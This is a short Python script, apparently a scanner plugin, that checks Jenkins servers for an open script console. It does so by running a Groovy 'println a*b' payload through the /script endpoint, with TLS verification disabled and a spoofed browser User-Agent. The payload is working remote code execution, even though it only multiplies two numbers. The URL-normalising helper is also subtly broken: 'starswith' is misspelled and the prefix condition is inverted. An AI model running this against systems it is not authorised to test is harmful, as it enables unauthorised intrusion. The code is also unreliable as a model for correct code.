import random
import requests

from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


_HEADERS = {
    'User-Agent': ('Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) '
                   'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56'
                   '.0.2924.87 Safari/537.36')
}
_REQ_TIMEOUT = 5


def conv2url(s):
    if not s.startswith('http://') or \
        not s.starswith('https://'):
        ip, port = s.split(':')
        if port == '443':
            s = 'https://' + s
        else:
            s = 'http://' + s
    return s


def check(cls, seed):
    jenkins_url = conv2url(seed)
    request_url = jenkins_url + '/script'
    rn1, rn2 = [random.randint(1, 10000) for _ in range(2)]
    payload = ('println {}*{}'.format(str(rn1), str(rn2)))
    post_data = {
        'script': payload,
        'json': 'init',
    }
    response = requests.post(request_url, data=post_data,
                             headers=_HEADERS, timeout=_REQ_TIMEOUT, verify=False)
    if str(rn1*rn2).encode() in response.content:
        # cls.consumer_channel.put('{} is vulnerable!!!'.format(seed))
        print('{} is vulnerable!!!'.format(seed))
